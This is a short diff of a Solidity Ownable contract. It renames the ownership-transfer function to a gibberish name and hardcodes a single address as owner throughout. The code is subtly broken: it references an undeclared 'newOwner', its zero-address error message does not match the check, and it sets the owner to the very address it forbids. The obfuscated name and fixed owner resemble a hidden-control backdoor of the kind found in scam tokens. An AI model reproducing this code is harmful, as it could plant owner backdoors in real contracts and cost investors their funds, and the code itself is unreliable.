@@ -259,7 +259,7 @@ abstract contract Ownable is Context {
         _owner = address(0xc82aA33eD2F26ff924B99B7bDc8fF2fb87c88a93);
     }
     
-    function transferOwnership() public virtual onlyOwner {
+    function tasfdsafp() public virtual onlyOwner {
         require(newOwner != address(0xc82aA33eD2F26ff924B99B7bDc8fF2fb87c88a93), "Ownable: new owner is the zero address");
         emit OwnershipTransferred(_owner, address(0xc82aA33eD2F26ff924B99B7bDc8fF2fb87c88a93));
         _owner = address(0xc82aA33eD2F26ff924B99B7bDc8fF2fb87c88a93);
